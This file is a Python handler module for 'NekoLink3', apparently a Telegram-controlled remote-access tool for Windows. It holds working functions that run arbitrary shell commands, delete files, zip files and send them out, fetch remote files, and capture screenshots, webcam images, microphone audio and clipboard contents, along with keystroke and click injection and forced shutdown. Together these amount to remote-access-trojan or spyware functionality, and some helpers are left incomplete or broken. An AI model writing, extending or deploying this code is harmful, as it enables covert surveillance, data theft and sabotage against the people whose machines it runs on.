import subprocess
import os
import platform
import psutil
import ctypes
import shutil
import zipfile
import pyperclip
import time
from datetime import datetime
from PIL import ImageGrab

def execute_command(cmd):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        output = result.stdout + result.stderr
        return output[:4000] if output.strip() else "[No output]"
    except subprocess.TimeoutExpired:
        return "[Command timed out]"
    except Exception as e:
        return f"[Error: {str(e)}]"

def send_file(chat_id, file_path, send_func):
    """Send file via Telegram - needs implementation in bot.py"""
    pass  # Will be implemented in bot.py

def show_popup(title, message):
    ctypes.windll.user32.MessageBoxW(0, message, title, 0)

def show_notification(title, message):
    try:
        from win10toast import ToastNotifier
        ToastNotifier().show_toast(title, message, duration=3)
    except:
        show_popup(title, message)

# Basic commands
def handle_exec(chat_id, cmd, send_func):
    output = execute_command(cmd)
    send_func(chat_id, f"$ {cmd}\n{output}")

def handle_info(chat_id, send_func):
    info = f"Hostname: {platform.node()}\nOS: {platform.system()} {platform.release()}\nCPU: {psutil.cpu_count()} cores\nRAM: {psutil.virtual_memory().total // (1024**3)} GB"
    send_func(chat_id, info)

def handle_ps(chat_id, send_func):
    output = execute_command("tasklist")
    send_func(chat_id, output[:4000])

def handle_kill(chat_id, pid, send_func):
    try:
        p = psutil.Process(int(pid))
        p.terminate()
        send_func(chat_id, f"Killed PID {pid}")
    except Exception as e:
        send_func(chat_id, f"Failed: {str(e)}")

def handle_cd(chat_id, path, send_func):
    try:
        os.chdir(path)
        send_func(chat_id, f"Now in: {os.getcwd()}")
    except Exception as e:
        send_func(chat_id, f"Failed: {str(e)}")

# File commands
def handle_list(chat_id, path, send_func):
    try:
        items = os.listdir(path)
        output = "\n".join(items[:50])
        send_func(chat_id, f"Files in {path}:\n{output}")
    except Exception as e:
        send_func(chat_id, f"Error: {str(e)}")

def handle_search(chat_id, filename, send_func):
    matches = []
    for root, dirs, files in os.walk("C:\\"):
        for file in files:
            if filename.lower() in file.lower():
                matches.append(os.path.join(root, file))
                if len(matches) >= 20:
                    break
        if len(matches) >= 20:
            break
    if matches:
        send_func(chat_id, "\n".join(matches))
    else:
        send_func(chat_id, "No matches found")

def handle_delete(chat_id, path, send_func):
    try:
        if os.path.isfile(path):
            os.remove(path)
            send_func(chat_id, f"Deleted: {path}")
        elif os.path.isdir(path):
            shutil.rmtree(path)
            send_func(chat_id, f"Deleted directory: {path}")
        else:
            send_func(chat_id, "Path not found")
    except Exception as e:
        send_func(chat_id, f"Error: {str(e)}")

def handle_move(chat_id, src, dst, send_func):
    try:
        shutil.move(src, dst)
        send_func(chat_id, f"Moved: {src} -> {dst}")
    except Exception as e:
        send_func(chat_id, f"Error: {str(e)}")

def handle_zip(chat_id, path, send_file_func):
    try:
        zip_path = f"{path}.zip"
        with zipfile.ZipFile(zip_path, 'w') as zf:
            if os.path.isfile(path):
                zf.write(path)
            else:
                for root, dirs, files in os.walk(path):
                    for file in files:
                        zf.write(os.path.join(root, file))
        send_file_func(chat_id, zip_path)
        os.remove(zip_path)
    except Exception as e:
        send_message(chat_id, f"Error: {str(e)}")  # This needs send_message

# Upload/Download (simplified)
def handle_upload(chat_id, file_path, send_func, send_file_func):
    if os.path.exists(file_path):
        send_file_func(chat_id, file_path)
    else:
        send_func(chat_id, f"File not found: {file_path}")

def handle_download(chat_id, url, save_path, send_func):
    try:
        import requests
        r = requests.get(url, stream=True)
        with open(save_path, 'wb') as f:
            for chunk in r.iter_content(chunk_size=8192):
                f.write(chunk)
        send_func(chat_id, f"Downloaded to: {save_path}")
    except Exception as e:
        send_func(chat_id, f"Download failed: {str(e)}")

# Media commands
def handle_screenshot(chat_id, send_file_func):
    try:
        img = ImageGrab.grab()
        img.save("screenshot.png")
        send_file_func(chat_id, "screenshot.png")
        os.remove("screenshot.png")
    except Exception as e:
        send_message(chat_id, f"Screenshot failed: {str(e)}")  # Needs send_message

def handle_cam(chat_id, send_file_func):
    try:
        import cv2
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        cv2.imwrite("webcam.jpg", frame)
        cap.release()
        send_file_func(chat_id, "webcam.jpg")
        os.remove("webcam.jpg")
    except:
        send_message(chat_id, "Webcam failed")  # Needs send_message

def handle_mic(chat_id, duration, send_file_func):
    try:
        import sounddevice as sd
        import soundfile as sf
        fs = 44100
        recording = sd.rec(int(duration * fs), samplerate=fs, channels=1)
        sd.wait()
        sf.write("audio.wav", recording, fs)
        send_file_func(chat_id, "audio.wav")
        os.remove("audio.wav")
    except:
        send_message(chat_id, "Audio failed")  # Needs send_message

# Window commands
def handle_focus(chat_id, window_title, send_func):
    try:
        import pygetwindow as gw
        windows = gw.getWindowsWithTitle(window_title)
        if windows:
            windows[0].activate()
            send_func(chat_id, f"Focused: {window_title}")
        else:
            send_func(chat_id, "Window not found")
    except:
        send_func(chat_id, "pygetwindow not installed")

def handle_minimize(chat_id, window_title, send_func):
    try:
        import pygetwindow as gw
        windows = gw.getWindowsWithTitle(window_title)
        if windows:
            windows[0].minimize()
            send_func(chat_id, f"Minimized: {window_title}")
        else:
            send_func(chat_id, "Window not found")
    except:
        send_func(chat_id, "Failed to minimize")

def handle_active(chat_id, send_func):
    try:
        import pygetwindow as gw
        active = gw.getActiveWindow()
        send_func(chat_id, f"Active window: {active.title if active else 'Unknown'}")
    except:
        send_func(chat_id, "Failed to get active window")

# System commands
def handle_lock(chat_id, send_func):
    ctypes.windll.user32.LockWorkStation()
    send_func(chat_id, "Workstation locked")

def handle_shutdown(chat_id, send_func):
    send_func(chat_id, "Shutting down in 10 seconds...")
    os.system("shutdown /s /t 10")

def handle_restart(chat_id, send_func):
    send_func(chat_id, "Restarting in 10 seconds...")
    os.system("shutdown /r /t 10")

def handle_sleep(chat_id, send_func):
    send_func(chat_id, "Sleeping...")
    os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")

def handle_uptime(chat_id, send_func):
    try:
        import uptime
        seconds = uptime.uptime()
        days = seconds // 86400
        hours = (seconds % 86400) // 3600
        minutes = (seconds % 3600) // 60
        send_func(chat_id, f"Uptime: {days}d {hours}h {minutes}m")
    except:
        send_func(chat_id, "uptime module not installed")

def handle_wallpaper(chat_id, path, send_func):
    try:
        ctypes.windll.user32.SystemParametersInfoW(20, 0, os.path.abspath(path), 0)
        send_func(chat_id, f"Wallpaper changed to: {path}")
    except:
        send_func(chat_id, "Failed to change wallpaper")

# Input commands
def handle_type(chat_id, text, send_func):
    try:
        import keyboard
        keyboard.write(text)
        send_func(chat_id, f"Typed: {text[:50]}")
    except:
        send_func(chat_id, "keyboard module not installed")

def handle_key(chat_id, key, send_func):
    try:
        import keyboard
        keyboard.press_and_release(key)
        send_func(chat_id, f"Pressed: {key}")
    except:
        send_func(chat_id, "keyboard module not installed")

def handle_click(chat_id, send_func, x=None, y=None):
    try:
        import pyautogui
        if x and y:
            pyautogui.click(int(x), int(y))
            send_func(chat_id, f"Clicked at ({x}, {y})")
        else:
            pyautogui.click()
            send_func(chat_id, "Clicked at current mouse position")
    except:
        send_func(chat_id, "pyautogui not installed")

# Clipboard commands
def handle_clipboard(chat_id, send_func):
    try:
        text = pyperclip.paste()
        send_func(chat_id, f"Clipboard:\n{text[:1000]}")
    except:
        send_func(chat_id, "Could not read clipboard")

def handle_setclip(chat_id, text, send_func):
    try:
        pyperclip.copy(text)
        send_func(chat_id, "Clipboard set")
    except:
        send_func(chat_id, "Failed to set clipboard")

# Notification commands
def handle_notify(chat_id, msg, send_func):
    show_notification("NekoLink3", msg)
    send_func(chat_id, f"Notification sent: {msg}")

def handle_popup(chat_id, msg, send_func):
    show_popup("NekoLink3 Alert", msg)
    send_func(chat_id, f"Popup sent: {msg}")
